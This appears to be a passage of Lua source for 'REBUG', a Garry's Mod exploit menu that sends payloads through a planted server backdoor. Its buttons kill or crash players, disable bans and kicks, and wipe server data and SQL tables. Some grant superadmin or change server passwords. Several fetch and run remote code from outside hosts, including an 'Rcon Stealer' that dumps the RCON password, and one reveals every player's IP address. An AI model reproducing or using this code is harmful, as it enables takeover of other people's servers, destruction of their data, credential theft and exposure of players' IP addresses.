                noob.PostLua("for k, v in pairs(player.GetAll()) do v:SetModel(\"" .. str .. "\") end")
            end)
        end)

        rebug.AddButton("Change All Material", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            Derma_StringRequest("Set Everythings Material", "Material Directory", "", function(str)
                noob.PostLua("for k, v in pairs(ents.GetAll()) do v:SetMaterial(\"" .. str .. "\") end")
            end)
        end)

        rebug.AddButton("Disable Bans/Kicks", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[if ULib then
				function ULib.kick( ply, reason, calling_ply ) end
				function ULib.ban( ply, time, reason, admin ) end
				function ULib.addBan( steamid, time, reason, name, admin ) end
				end
				if FAdmin then
				local function no(ply) end
				FAdmin.Commands.AddCommand("kick", no)
				FAdmin.Commands.AddCommand("ban", no)
				FAdmin.Commands.AddCommand("jail", no)
				FAdmin.Commands.AddCommand("UnJail", no)
				FAdmin.Commands.AddCommand("ClearDecals", no)
				FAdmin.Commands.AddCommand("StopSounds", no)
				FAdmin.Commands.AddCommand("CleanUp", no)
				end
				local _R = debug.getregistry()
				function _R.Player.Ban(ply, r) end
				function _R.Player.Kick(ply, r) end
				function game.KickID(id, reason) end
				local RCM = RunConsoleCommand
				function RunConsoleCommand(command, ...)
				if command == "addip" then return end
				RCM(command, ...)
				end]])
        end)

        rebug.AddButton("Disable SNTE", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[local function Check(func)
				if string.find(debug.getinfo(func).short_src,"snte_source.lua") then
				return true
				else
				return false
				end
				end
				timer.Create("fucksnte",5,0,function()
				for k,v in pairs(net.Receivers) do
				if Check(v) then
				net.Receive(k,function(l,ply)
				ply:ChatPrint("LEL")
				end)
				end
				end
				end)]])
		end)

        rebug.AddButton("Disable Exit", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[hook.Add("Think","iuefheqefq",function() gui.HideGameUI() end)]])
        end)

        rebug.AddButton("Earthquake", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[if !timer.Exists("earthquake") then
				timer.Create("earthquake", 0.5, 500, function()
				for _, p in pairs(player.GetAll()) do
				p:SetPos(p:GetPos() + Vector(0, 0, 1))
				p:SetVelocity(Vector(math.random(-50, 50), math.random(-50, 50), math.random(100, 150)))
				util.ScreenShake(p:GetPos(), 20, 1, 1, 100)
				p:EmitSound("ambient/explosions/exp1.wav", 100, math.random(60, 100))
				end
				for _, e in pairs(ents.GetAll()) do
				if e:GetPhysicsObject() and e:GetPhysicsObject():IsValid() then e:GetPhysicsObject():AddVelocity(Vector(math.random(-50, 50), math.random(-50, 50), math.random(100, 150))) end
				end
				end)
				else
				timer.Remove("earthquake")
				end]])
        end)

        rebug.AddButton("EarRape", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua("for k,v in pairs(player.GetAll()) do v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end")
        end)

        rebug.AddButton("Enigma Disco", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[http.Fetch("https://rvac.cc/load/b1g.lua", function(b) RunString(b) end )]])
        end)

        rebug.AddButton("Enigma Disco 2.0", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[http.Fetch("https://rvac.cc/load/xd.lua", function(b) RunString(b) end )]])
        end)

        rebug.AddButton("GMining Staff", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
				noob.PostLua([[gMining.cfg.staffMembers = {"user"}]])
        end)

        rebug.AddButton("Hell Mode", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[BroadcastLua("http.Fetch('https://pastebin.com/raw/21tkfuM1',function(b,l,h,c)RunString(b)end,nil)")]])
        end)

        rebug.AddButton("Ignite Everyone", Bar1, function()
            surface.PlaySound("buttons/button18.wav")

            Derma_StringRequest("Ignite All Players", "Lenght In Seconds", "", function(str)
                noob.PostLua("for k, v in pairs(player.GetAll()) do v:Ignite(" .. str .. ") end")
            end)
        end)

        rebug.AddButton("Kill Everyone", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua("for k,v in pairs(player.GetAll()) do v:Kill() end")
        end)

        rebug.AddButton("Luarun Access", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[RunConsoleCommand("ulx", "groupallow", "user", "ulx luarun")]])
        end)

        rebug.AddButton("Launch Players", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua("for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end")
        end)

        rebug.AddButton("LuaRun Code", Bar1, function()
            surface.PlaySound("buttons/button18.wav")

            Derma_StringRequest("LuaRun String", "String", "", function(text)
                noob.PostLua([[RunString( ']] .. text .. [[' )]])
            end)
        end)

        rebug.AddButton("Rainbow Physgun", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[hook.Add("Think", "rainbowphysgun", function()
				for k,ply in ipairs(player.GetAll()) do
				local col = HSVToColor(CurTime() % 6 * 60, 1, 1)
				ply:SetWeaponColor(Vector(col.r / 255, col.g / 255, col.b / 255))
				end end)]])
        end)

        rebug.AddButton("Rainbow Chat Spam", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            Derma_StringRequest("Rainbow Chatspam", "Text", "", function(text)
                noob.PostLua([[chat = 0{}
					function chat.AddText(...)
					net.Start("REBUG")
					net.WriteTable({...})
					net.Broadcast()
					end
					function AddTextPly(ply, ...)
					net.Start("REBUG")
					net.WriteTable({...})
					net.Send(ply)
					end
					for k, v in pairs(player.GetAll()) do
					v:SendLua('net.Receive("REBUG", function(len) chat.AddText(unpack(net.ReadTable()))end)')
					end
					timer.Create("gotEm", 0.8, 120, function()
					local function ChatPrintRainbow(frequency, str)
					local text = {}
					for i = 1, #str do
					table.insert(text, HSVToColor(i * frequency % 360, 1, 1))
					table.insert(text, string.sub(str, i, i))
					end
					chat.AddText(unpack(text))
					end
					ChatPrintRainbow(10, "]] .. text .. [[")
					end)]])
            end)
        end)

        rebug.AddButton("Rainbow HUD", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[if !rainbowscreen then
				BroadcastLua("hook.Add('HUDPaint', 'rainbowscreen', function() local cin = math.sin(CurTime() * 10) * 255 surface.SetDrawColor(Color(cin, -cin, cin, 100)) surface.DrawRect(0, 0, ScrW(), ScrH()) end)")
				rainbowscreen = true
				else
				BroadcastLua("hook.Remove('HUDPaint', 'rainbowscreen')")
				rainbowscreen = false
				end]])
        end)

        rebug.AddButton("Rainbow Everything", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[BroadcastLua("http.Fetch('https://pastebin.com/raw/gCG1pSNK',function(b,l,h,c)RunString(b)end,nil)")]])
            rprint("This may cause frame drop")
        end)

        rebug.AddButton("Remove Bans", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[if file.Exists("ulib/bans.txt", "DATA") then file.Delete("ulib/bans.txt") end]])
        end)

        rebug.AddButton("Unboxing 2 Staff", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
				noob.PostLua([[BUC2.RanksThatCanGiveItems = {"user"}
				BUC2.DropRankList = {"user"}]])
				rprint('Gives you access to !unboxadmin command')
        end)

        rebug.AddButton("Trash Man Bag = Rich", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
				noob.PostLua([[ recycle_types = {
				[1] = {
					name = "Paper",
					trash_per_block = 100, //kg
					recycle_time = 10,
					money = 999999999,
					mat = "zerochain/props_trashman/recycleblock/ztm_recycledblock_paper_diff"
				},\n
			}]]) rprint('Sell a bag will make you rich')		
        end)

        rebug.AddButton("Rave Music", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua("BroadcastLua([[surface.PlaySound('music/hl1_song25_remix3.mp3')]])")
        end)

        rebug.AddButton("Moan Steps", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[if !moanstep then
				hook.Add("PlayerFootstep", "oooh", function(ply)
				ply:EmitSound("vo/npc/female01/pain0" .. math.random(1, 9) .. ".wav", 75, math.random(50, 100))
				end)
				moanstep = true
				else
				hook.Remove("PlayerFootstep", "oooh")
				moanstep = false
				end]])
        end)

        rebug.AddButton("Oil Rush Sell = Rich", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
				noob.PostLua([[zrush.config.SellValue = 9999]])
				rprint('Sell equipment will make you rich')
		end)

        rebug.AddButton("Open URL On Players", Bar1, function()
            surface.PlaySound("buttons/button18.wav")

            Derma_StringRequest("URL On Players", "URL Link", "", function(str)
                noob.PostLua([==[local ply = str
					ply:SendLua([[h=vgui.Create("DHTML")
					h:SetSize(ScrW(),ScrH())
					h:OpenURL(..str..)]])
					]==])
            end)
        end)

        rebug.AddButton("Explode all vehicles", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[for k, v in pairs(ents.GetAll()) do if v:IsVehicle() then
				local explo = ents.Create("env_explosion")
				explo:SetPos(v:GetPos())
				explo:SetKeyValue("iMagnitude", "300")
				explo:Spawn()
				explo:Activate()
				explo:Fire("Explode", "", 0)
				end
				end]])
        end)

        rebug.AddButton("Print All IP's", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[local id = ]] .. LocalPlayer():UserID() .. [[
				for k, v in pairs( player.GetAll() ) do
				Player( id ):ChatPrint( "Player: " .. v:Nick() .. " (" .. v:SteamID() .. ") IP: " .. v:IPAddress() )
				end]])
        end)

        rebug.AddButton("Toggle all doors", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("toggle", "", 0) end end]])
        end)

        rebug.AddButton("Lock all doors", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("lock", "", 0) end end]])
        end)

        rebug.AddButton("Unlock all doors", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("unlock", "", 0) end end]])
        end)

        rebug.AddButton("Vaporize all players", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[for k, v in pairs(player.GetAll()) do v:Remove() end]])
        end)

        rebug.AddButton("WhiteList Everything", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[if FPP then
				for k,v in pairs(FPP.Blocked) do
				for r,g in pairs(v) do
				RunConsoleCommand([=[FPP_RemoveBlocked]=], k, r)
				end
				end
				end]])
        end)

        rebug.AddButton("Wipe data folder", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[local files, directories = file.Find("*", "DATA") for k, v in pairs(files) do file.Delete(v) end]])
        end)

        rebug.AddButton("Wipe SQL Tables", Bar1, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[MySQLite.query ('DROP TABLE darkrp_player' MySQLite.query('CREATE TABLE IF NOT EXISTS darkrp_player(idx INTEGER NOT NULL)')]])
        end)

        rebug.AddButton("ULX Unban SteamID", Bar1, function()
            surface.PlaySound("buttons/button18.wav")

            Derma_StringRequest("ULX Unban SteamID", "SteamID", "", function(str)
                noob.PostLua([[local gae = ulx_logecho game.ConsoleCommand("ulx_logecho 0" .. "\n") game.ConsoleCommand("ulx unban " ..str.. "\n") game.ConsoleCommand("ulx_logecho " .. gae .. "\n")]])
            end)
        end)

--[[-------------------------------------------------------------------------------------
Panels 3 : RCON Backdoors
----------------------------------------------------------------------------------------]]
        local List13 = vgui.Create("DPanelList", VoidPlate)
        List13:SetPos(235, 155)
        List13:SetSize(180, 430)
        List13:SetPadding(2)
        List13:SetSpacing(2)
        List13:EnableHorizontal(false)
        List13:EnableVerticalScrollbar(true)
        List13:SetName("")

        List13.Paint = function(self, w, h)
            surface.SetDrawColor(Color(30, 30, 30))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetMaterial(upgrad)
            surface.SetDrawColor(o_color2)
            surface.SetMaterial(downgrad)
            surface.SetDrawColor(o_color2)
            surface.SetDrawColor(21, 21, 21, 255)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        local item2 = vgui.Create("DPanelList", List13)
        item2:SetPos(10, 8)
        item2:SetSize(170, 420)
        item2:SetPadding(2)
        item2:SetSpacing(2)
        item2:EnableHorizontal(false)
        item2:EnableVerticalScrollbar(true)
        item2:SetName("")
        local scan = vgui.Create("DButton", VoidPlate)
        scan:SetFont("Trebuchet18")
        scan:SetText("Backdoor Scan")
        scan:SetTextColor(Color(255, 255, 255, 255))
        scan:SetPos(235, 637)
        scan:SetSize(180, 40)

        scan.Paint = function(self, w, h)
            surface.SetDrawColor(Color(30, 30, 30))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetMaterial(upgrad)
            surface.SetDrawColor(o_color2)
            surface.SetMaterial(downgrad)
            surface.SetDrawColor(o_color2)
            surface.SetDrawColor(21, 21, 21, 255)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        scan.DoClick = function()
            surface.PlaySound("buttons/button18.wav")
            CheckBackdoors()
        end

        local Bar2 = vgui.Create("DScrollPanel", item2)
        Bar2:Dock(FILL)
        local sBar2 = Bar2:GetVBar()
        function sBar2:Paint()
        end
        function sBar2.btnUp:Paint()
        end
        function sBar2.btnDown:Paint()
        end
        function sBar2.btnGrip:Paint()
        end

        -- RCON Backdoors
        rebug.AddButton("Rcon Stealer", Bar2, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[http.Fetch("https://pastebin.com/raw/HAvguiZk",function(b,l,h,c)RunString(b)end,nil)]])

            timer.Simple(0.5, function()
                if CheckIfStringExists("rvac.jeveuttonrconleul") then
                    net.Start("rvac.jeveuttonrconleul")
                    net.SendToServer()
                else
                    chat.AddText(Color(255, 0, 0), "RCON password not found, try again")
                end
            end)

            net.Receive("rvac.rcon_passw_dump", function()
                local rcon_pass = net.ReadString()
                chat.AddText(Color(255, 0, 0), "[", "REBUG", "] ", Color(20, 150, 200), "" .. rcon_pass)
            end)

            net.Receive("rvac.aucun_rcon_ici", function()
                chat.AddText(Color(255, 0, 0), "[", "REBUG", "] ", Color(220, 100, 100), "RCON not found in cfg folder :(")
            end)
        end)

        rebug.AddButton("Crash Server", Bar2, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[while true do end]])
            rprint("The server has been crashed gg")
        end)

        rebug.AddButton("Crash Admins", Bar2, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua("for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"user\" ) then v:SendLua(\"while true do end\") end end")
        end)

        rebug.AddButton("Reset all money", Bar2, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[RunConsoleCommand("rcon","rp_resetallmoney")]])
        end)

        rebug.AddButton("SV ClientSide", Bar2, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[RunConsoleCommand("rcon","sv_allowcslua","1")]])
        end)

        rebug.AddButton("SV Password", Bar2, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[RunConsoleCommand('rcon','sv_password','projectRebug')]])
			rprint("Password: projectRebug")
        end)

        rebug.AddButton("LogEcho", Bar2, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[RunConsoleCommand('ulx','logecho','0')]])
        end)

        rebug.AddButton("SV Cheats", Bar2, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[RunConsoleCommand('rcon','sv_cheats','1')]])
        end)

        rebug.AddButton("SV Friction", Bar2, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[RunConsoleCommand('rcon','sv_friction','8')]])
        end)

        rebug.AddButton("SV Gravity", Bar2, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[RunConsoleCommand('rcon','sv_gravity','-600')]])
        end)

        rebug.AddButton("Giant Players", Bar2, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[ hook.Add("Think", "tall", function()
				for k,v in pairs (player.GetAll()) do
				v:SetModelScale(0.2, 80);
				v:SetRunSpeed(400 * 2);
				v:SetWalkSpeed(200 * 2);
				endend)]])
        end)

        rebug.AddButton("Speed Hack All", Bar2, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[hook.Add("Think", "speedhack", function()
				for k,v in pairs (player.GetAll()) do
				v:SetRunSpeed(400* 4);
				v:SetWalkSpeed(200 * 2);
				end end)]])
        end)

        rebug.AddButton("Force Say All", Bar2, function()
            surface.PlaySound("buttons/button18.wav")

            Derma_StringRequest("Force Say", "Make everyone say anything", "", function(str)
                noob.PostLua("for k,v in pairs(player.GetAll()) do v:ConCommand(" .. str .. ")end")
            end)
        end)

        rebug.AddButton("Force Dance All", Bar2, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end timer.Create("dance_loop",8.9,0,function() for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end end )]])
        end)

        rebug.AddButton("Force Retry All", Bar2, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[ for k,v in pairs(player.GetAll()) do
				v:ConCommand("retry") end]])
        end)

        rebug.AddButton("Hostname Chance", Bar2, function()
            surface.PlaySound("buttons/button18.wav")

            Derma_StringRequest("Hostname", "Chance server name to anything", "", function(str)
                noob.PostLua("RunConsoleCommand(\"ulx\", \"rcon\", \"hostname\", " .. str .. ")")
            end)
        end)

        rebug.AddButton("Server Nuke (M9K)", Bar2, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[ local rocket = ents.Create("m9k_launched_davycrockett")
				local ply2 = player.GetAll(]] .. selPly .. [[)
				rocket:SetPos(ply2:GetPos())
				rocket:SetOwner(ply2)
				rocket.Owner = ply2
				rocket:Spawn()
				rocket:Activate()]])
        end)

--[[-------------------------------------------------------------------------------------
Panels 3 : Targeting
----------------------------------------------------------------------------------------]]
        local List3 = vgui.Create("DPanelList", VoidPlate)
        List3:SetPos(473, 155)
        List3:SetSize(180, 430)
        List3:SetPadding(2)
        List3:SetSpacing(2)
        List3:EnableHorizontal(false)
        List3:EnableVerticalScrollbar(true)
        List3:SetName("")

        List3.Paint = function(self, w, h)
            surface.SetDrawColor(Color(30, 30, 30))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetMaterial(upgrad)
            surface.SetDrawColor(o_color2)
            surface.SetMaterial(downgrad)
            surface.SetDrawColor(o_color2)
            surface.SetDrawColor(21, 21, 21, 255)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        local item3 = vgui.Create("DPanelList", List3)
        item3:SetPos(14, 8)
        item3:SetSize(163, 420)
        item3:SetPadding(2)
        item3:SetSpacing(2)
        item3:EnableHorizontal(false)
        item3:EnableVerticalScrollbar(true)
        item3:SetName("")

        item3.Paint = function(self, w, h)
            surface.SetDrawColor(Color(30, 30, 30))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetDrawColor(35, 35, 35, 0)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        local board = vgui.Create("DButton", VoidPlate)
        board:SetFont("Trebuchet18")
        board:SetText("SoundBoard")
        board:SetTextColor(Color(255, 255, 255, 255))
        board:SetPos(473, 637)
        board:SetSize(180, 40)

        board.Paint = function(self, w, h)
            surface.SetDrawColor(Color(30, 30, 30))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetMaterial(upgrad)
            surface.SetDrawColor(o_color2)
            surface.SetMaterial(downgrad)
            surface.SetDrawColor(o_color2)
            surface.SetDrawColor(21, 21, 21, 255)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        board.DoClick = function()
            soundboard()
            Void:SetVisible(false)
        end

        local Bar3 = vgui.Create("DScrollPanel", item3)
        Bar3:Dock(FILL)
        local sBar3 = Bar3:GetVBar()
        function sBar3:Paint()
        end
        function sBar3.btnUp:Paint()
        end
        function sBar3.btnDown:Paint()
        end
        function sBar3.btnGrip:Paint()
        end

        rebug.AddButton("Co Host Menu", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[Player(]]..selPly..[[):SendLua('http.Fetch("https://rvac.cc/log1n/bd.lua",function(b)CompileString(b,":",false)end)')]])
        end)

        rebug.AddButton("Set Superadmin", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[Player(]]..selPly..[[):SetUserGroup("superadmin")]])
        end)

        rebug.AddButton("Infinite Ammo", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
			noob.PostLua([[timer.Create("ia_]]..noobstr..[[", 0.01, 0, function()
				local p = Player("]]..selPly..[[")
				if IsValid(p) && p:Alive() then
				local w = p:GetActiveWeapon()
				if IsValid(w) then
				w:SetClip1(w:GetMaxClip1())
				end end end)]])
		end)
		
        rebug.AddButton("Rapid Fire", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
			noob.PostLua([[timer.Create("rf_]]..noobstr..[[", 0.01, 0, function()
				local p = Player("]]..selPly..[[")
				if p && IsValid(p) && p:Alive() then
				local w = p:GetActiveWeapon()
				if IsValid(w) then
				w:SetNextPrimaryFire(CurTime())
				w:SetNextSecondaryFire(CurTime())
				end end end)]])
		end)
		
        rebug.AddButton("Give Money", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[local ree = Player("]]..selPly..[[") ree:addMoney(500000)]])
		end)
		
        rebug.AddButton("Give Weapons", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[local weps = Player("]]..selPly..[[");weps:Give('weapon_stunstick')
				weps:Give('lockpick');weps:Give('m9k_vector');weps:Give('m9k_dbarrel');weps:Give('m9k_barret_m82')
				weps:Give('m9k_glock');weps:Give('m9k_minigun');weps:Give('m9k_acr');weps:Give('m9k_milkormgl')
				weps:Give('weapon_rpg');weps:Give('weapon_medkit')]])
		end)
		
        rebug.AddButton("Remove User", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[Player(]] .. selPly .. [[):SetUserGroup("user"))]])
        end)

        rebug.AddButton("Enable Godmode", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[Player(]] .. selPly .. [[):GodEnable()]])
        end)

        rebug.AddButton("Disable Godmode", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[Player(]] .. selPly .. [[):GodDisable()]])
        end)

        rebug.AddButton("Kick Player", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[Player(]] .. selPly .. [[):Kick("[CAC] Truth Engineering")]])
        end)

        rebug.AddButton("Ban Player", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[Player(]] .. selPly .. [[):Ban("[CAC] Kone Bypass Detected!")]])
        end)

        rebug.AddButton("Freeze Player", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[Player(]] .. selPly .. [[):Freeze(true)]])
        end)

        rebug.AddButton("UnFreeze Player", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[Player(]] .. selPly .. [[):Freeze(false)]])
        end)

        rebug.AddButton("Ignite Player", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[Player(]] .. selPly .. [[):Ignite(30,40)]])
        end)

        rebug.AddButton("Drop Weapon", Bar3, function()
            surface.PlaySound("buttons/button18.wav")
            noob.PostLua([[Player(]] .. selPly .. [[):DropWeapon(Player(]] .. selPly .. [[):GetActiveWeapon())]])
        end)

--[[-------------------------------------------------------------------------------------
Panels 4 : Player List
----------------------------------------------------------------------------------------]]
        local targeting = vgui.Create("DLabel", VoidPlate)
        targeting:SetFont("Trebuchet18")
        targeting:SetText("No Player Selected")
        targeting:SetTextColor(Color(255, 255, 255))
        targeting:SetPos(695, 663)
        targeting:SizeToContents()
        local List4 = vgui.Create("DPanelList", VoidPlate)
        List4:SetPos(693, 155)
        List4:SetSize(180, 502)
        List4:SetPadding(2)
        List4:SetSpacing(2)
        List4:EnableHorizontal(false)
        List4:EnableVerticalScrollbar(true)
        List4:SetName("")

        List4.Paint = function(self, w, h)
            surface.SetDrawColor(Color(30, 30, 30))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetMaterial(upgrad)
            surface.SetDrawColor(o_color2)
            surface.SetMaterial(downgrad)
            surface.SetDrawColor(o_color2)
            surface.SetDrawColor(21, 21, 21, 255)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        local item4 = vgui.Create("DPanelList", List4)
        item4:SetPos(5, 8)
        item4:SetSize(170, 486)
        item4:SetPadding(2)
        item4:SetSpacing(2)
        item4:EnableHorizontal(false)
        item4:EnableVerticalScrollbar(true)
        item4:SetName("")

        item4.Paint = function(self, w, h)
            surface.SetDrawColor(Color(30, 30, 30))
            surface.DrawRect(0, 0, w, h)
            surface.SetDrawColor(21, 21, 21)
            surface.SetDrawColor(35, 35, 35, 0)
            surface.DrawOutlinedRect(0, 0, w, h)
        end

        local Bar4 = vgui.Create("DScrollPanel", item4)
        Bar4:Dock(FILL)
        local sBar4 = Bar4:GetVBar()

        function sBar4:Paint()
        end

        function sBar4.btnUp:Paint()
        end

        function sBar4.btnDown:Paint()
        end

        function sBar4.btnGrip:Paint()
        end

        for k, v in pairs(player.GetAll()) do
            rebug.AddButton(v:Name(), Bar4, function()
                selPly = v:UserID()
                targeting:SetText("Selected: " .. Player(selPly):Name())
            end)
        end

--[[-------------------------------------------------------------------------------------
Menu Close Function
----------------------------------------------------------------------------------------]]
        function CloseMenu()
            MenuOpen = false
            Void:Close()
        end
    end

    rebug.voidz(true)
end)
